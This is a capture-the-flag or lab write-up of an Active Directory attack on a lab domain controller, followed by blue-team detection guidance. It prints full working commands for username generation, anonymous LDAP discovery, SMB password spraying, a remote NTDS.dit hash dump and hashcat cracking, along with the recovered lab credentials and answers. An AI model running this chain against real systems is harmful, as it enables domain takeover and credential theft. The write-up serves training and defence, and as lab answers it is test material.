# Overview

This lab simulated an external engagement against the Inlanefreight domain controller where three employee names gathered from OSINT (John Marston, Carol Johnson, Jennifer Stapleton) were converted into candidate usernames and used for password attacks. The objective was to obtain valid domain credentials, capture the NTDS.dit database, dump the domain hashes, and crack a target user's password offline.

## MITRE ATT&CK Mapping

- Reconnaissance
    - [T1589] Gather Victim Identity Information
    - [T1589.002] Email Addresses / Employee Names (OSINT)
- Discovery
    - [T1087.002] Account Discovery: Domain Account
    - [T1590.002] Gather Victim Network Information: DNS/Domain Name
- Credential Access
    - [T1110.003] Brute Force: Password Spraying
    - [T1003.003] OS Credential Dumping: NTDS
    - [T1110.002] Brute Force: Password Cracking

### Step-by-Step Walkthrough

#### Username Enumeration

- Cloned username-anarchy to generate candidate usernames from the three OSINT-derived employee names.

    ```
    git clone https://github.com/urbanadventurer/username-anarchy.git
    ```

- Generated permutations from the employee names stored in `usernames.txt`.

    ```
    ./username-anarchy -i usernames.txt
    ```
    ```
    john
    johnmarston
    j.marston
    jmarston
    [...]
    carol
    cjohnson
    [...]
    jennifer
    jstapleton
    [...]
    ```
- Selected the **firstinitial+lastname** convention as the primary candidate set: **jmarston**, **cjohnson**, **jstapleton**.

#### Domain Discovery

- Initial attempts assumed the domain was `inlanefreight.local`, which caused kerbrute to return `Wrong Realm` (the DC rejected that realm). Queried the DC anonymously over LDAP to retrieve the real naming context.

    ```
    ldapsearch -x -H ldap://10.129.202.85 -s base namingContexts
    ```
    ```
    namingContexts: DC=ILF,DC=local
    namingContexts: CN=Configuration,DC=ILF,DC=local
    namingContexts: CN=Schema,CN=Configuration,DC=ILF,DC=local
    namingContexts: DC=DomainDnsZones,DC=ILF,DC=local
    namingContexts: DC=ForestDnsZones,DC=ILF,DC=local
    result: 0 Success
    ```
- Anonymous LDAP bind succeeded and `namingContexts` revealed the real domain was **ILF.local**, not `inlanefreight.local`.

#### Password Spraying

- Sprayed the `fasttrack.txt` wordlist against SMB using the `jmarston` username, filtering out failed attempts.

    ```
    netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt | grep -v FAILURE
    ```
    ```
    SMB  10.129.202.85  445  ILF-DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
    SMB  10.129.202.85  445  ILF-DC01  [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
    ```
- Recovered **jmarston:P@ssword!** with `(Pwn3d!)`, confirming the account held **local admin rights** on the DC.
- Target host identified as **ILF-DC01**, Windows Server 2019 Build 17763, SMB signing enabled.
- A broader spray also returned the additional credential **cjohnson:Welcome1212**. [VERIFY: command for cjohnson hit not captured in provided output]

#### NTDS.dit Capture and Hash Dump

- Used the netexec `ntdsutil` module with jmarston's credentials to dump the AD database directly from the DC.

    ```
    netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -M ntdsutil
    ```
    ```
    NTDSUTIL  [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\179576569
    NTDSUTIL  [+] NTDS.dit dumped to C:\Windows\Temp\179576569
    NTDSUTIL  [*] Copying NTDS dump to /tmp/tmpfqmm5076
    NTDSUTIL  [+] Deleted C:\Windows\Temp\179576569 remote dump directory
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
    ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
    ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
    ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
    ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
    NTDSUTIL  [+] Dumped 9 NTDS hashes to /home/htb-ac-440204/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-11-27_024807.ntds
    ```
- Dumped **9 NTDS hashes** including the domain Administrator, krbtgt, and all three target accounts.
- Extracted Jennifer Stapleton's NT hash: **jstapleton -> 92fd67fd2f49d0e83744aa82363f021b**.

#### Password Cracking

- Cracked the extracted NT hash offline with hashcat mode 1000 (NTLM) against rockyou.txt.

    ```
    sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
    ```
    ```
    92fd67fd2f49d0e83744aa82363f021b:Winter2008
    Status...........: Cracked
    Hash.Mode........: 1000 (NTLM)
    ```
- Recovered Jennifer Stapleton's clear-text password: **Winter2008**.

#### Answers

- John Marston's credentials: **jmarston:P@ssword!**
- Jennifer Stapleton's clear-text password: **Winter2008**

#### Investigation (Blue Team)

**1. Account Enumeration / Domain Discovery**
**Attack Step:** Performed an anonymous LDAP bind to the DC to read the `namingContexts` attribute and identify the real domain name.

**Detection:**
- Directory Service / LDAP logs: Anonymous (unauthenticated) LDAP bind followed by a base-scope query for `namingContexts` from an external, non-domain host.
- Windows Security log: Event ID 4662 for directory object access with an anonymous or null session.

**Investigation:**
- Identify the source IP of the LDAP bind and confirm whether it maps to a known internal asset; external or unrecognized sources are suspect.
- Review the frequency and timing of base-object LDAP queries that read only metadata attributes (`namingContexts`, `defaultNamingContext`), a common reconnaissance pattern.
- Confirm whether anonymous LDAP binds should be permitted; correlate with the host that later authenticated via SMB.

**2. Password Spraying**
**Attack Step:** Sprayed a wordlist against SMB for the `jmarston` account until a valid password was found.

**Detection:**
- Windows Security log: Event ID 4625 (failed logon) in high volume for a single or small set of accounts from one source, followed by Event ID 4624 (successful logon) on the hit.
- Logon type 3 (network) against the DC over SMB.

**Investigation:**
- Group 4625 events by source IP and account to spot the one-password-many-accounts or many-passwords-one-account spray pattern.
- Identify the exact timestamp of the successful 4624 for jmarston and pivot to all subsequent activity from that source and account.
- Check whether the compromised account had local admin rights on the DC, which should be rare and reviewed.

**3. NTDS.dit Capture**
**Attack Step:** Used ntdsutil remotely via SMB to dump the NTDS.dit database and exfiltrate the domain hashes.

**Detection:**
- Windows Security log: Event ID 4624 (logon type 3) for jmarston on the DC, followed by remote service/process creation.
- Event ID 7045 (service installed) or 4697, and process-creation Event ID 4688 for `ntdsutil.exe` spawned non-interactively.
- Volume Shadow Copy creation and file writes under `C:\Windows\Temp\` followed by deletion of the dump directory.
- Event ID 4656 / 4663 for access to the `ntds.dit` file.

**Investigation:**
- Correlate the jmarston network logon with `ntdsutil.exe` execution and shadow-copy creation on the DC within the same session.
- Review `C:\Windows\Temp\` for short-lived subdirectories created and deleted by a remote session.
- Treat any NTDS.dit access as a domain-wide compromise: krbtgt and all account hashes must be considered exposed, warranting a double krbtgt reset and forced password resets.

**4. Offline Password Cracking**
**Attack Step:** Cracked the exfiltrated NT hashes offline with hashcat.

**Detection:**
- Not directly detectable on the target; occurs offline after exfiltration.

**Investigation:**
- Assume any dumped hash is recoverable; prioritize resetting all domain account passwords and enforcing complexity/length and banned-password policies.
- Audit for weak or seasonal passwords (e.g., Season+Year patterns) that fall quickly to dictionary attacks.
